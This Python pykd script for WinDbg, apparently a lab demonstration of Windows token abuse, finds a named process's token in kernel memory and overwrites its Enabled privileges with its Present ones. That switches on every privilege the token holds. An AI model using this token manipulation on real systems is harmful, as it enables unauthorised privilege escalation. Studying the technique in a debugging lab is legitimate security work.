import pykd

def find_process(process_name):
    try:
        # Use the WinDbg command to list all processes
        process_list = pykd.dbgCommand("!process 0 0")

        # Check if the process name is in the list
        if process_name.lower() in process_list.lower():
            print(f"Process '{process_name}' is running.")
            return True
        else:
            print("Process not found.")
            return False
    except Exception as e:
        print(f"Error retrieving process list: {e}")
        return False

def find_process_address(eprocess):
    #Look for the address that come after PROCESS
    process_info = eprocess.split()
    for i in range(len(process_info)):
            if process_info[i].lower() == "process":
                process_address = process_info[i + 1]
                print(f"Memory address for process is: {process_address}")
                return process_address
            print("Process not found.")
    return None


def find_token_address(token):
 # Find the position of the colon
        colon_pos = token.index(':')
        
        # Extract the address part after the colon
        memory_address = token[colon_pos + 1:].strip().split()[0]
        
        # Remove the backtick and combine the parts
        memory_address = memory_address.replace('`', '')

        # Convert the memory address to an integer
        memory_address_int = int(memory_address, 16)
        
        # Zero out the last 4bits by masking with 0xFFFFFFFFFFFFFFF0
        adjusted_memory_address_int = memory_address_int & 0xFFFFFFFFFFFFFFF0
        
        # Convert the adjusted memory address back to a hexadecimal string
        adjusted_memory_address = hex(adjusted_memory_address_int)

        print(f"find token in address: {adjusted_memory_address}")

        return adjusted_memory_address

def get_present_privileges(token_privileges):
        # Find the position of the first colon that is the present privileges
        colon_pos = token_privileges.index(':')
        
        # Extract the value part after the colon
        present_value = token_privileges[colon_pos + 1:].strip().split()[0]
        
        # Convert the extracted value to an integer
        present_privileges = int(present_value.replace('`', ''), 16)

        return present_value


#The offset of the token in my windows version is 0x4B8
TOKEN_OFFSET = 0x4b8

#The offset of the privileges in my windows version is 0x40
PRIVILEGES_OFFSET = 0x40

#The offset of the present values of privileges in my windows version is 0x08
ENABLED_OFFSET = 0x08

def main():
    # Print Title
    print("Token Abuse example")
    
    # Ask user the name of the process
    process = input("Please enter the name of the process you want to increase the privileges: ")

    if find_process(process):
        # If the process is running, continue
        print(f"Get process info for: {process}")
        
        # Execute the WinDbg command !process 0 0 and get the output
        windbg_command = f"!process 0 0 {process}"
        try:
            result = pykd.dbgCommand(windbg_command)
            #find process address
            process_address = find_process_address(result)
            if process_address:
                #get token and cast as EX_FAST_REF
                windbg_command = f"dt !_EX_FAST_REF {process_address}+{TOKEN_OFFSET:#x}"
                result = pykd.dbgCommand(windbg_command)

                #Find token adresss
                token_addr = find_token_address(result)

                #Get privileges from token structure
                windbg_command = f"dt !_SEP_TOKEN_PRIVILEGES {token_addr}+{PRIVILEGES_OFFSET:#x}"
                # print (windbg_command)
                result = pykd.dbgCommand(windbg_command)
                print(f"Process '{process}' initial privileges: \n {result}")

                #set Enabled privileges with the value from present
                present_priv = get_present_privileges(result)

                #Set privileges from token structure
                windbg_command = f"eq {token_addr}+{PRIVILEGES_OFFSET:#x}+{ENABLED_OFFSET:#x} {present_priv}"
                # print (windbg_command)
                result = pykd.dbgCommand(windbg_command)

                #Get privileges from token structure for check the result
                windbg_command = f"dt !_SEP_TOKEN_PRIVILEGES {token_addr}+{PRIVILEGES_OFFSET:#x}"
                # print (windbg_command)
                result = pykd.dbgCommand(windbg_command)

                print(f"Process '{process}' final privileges: \n {result}")

        except Exception as e:
            print(f"Error executing WinDbg command: {e}")

if __name__ == "__main__":
    main()
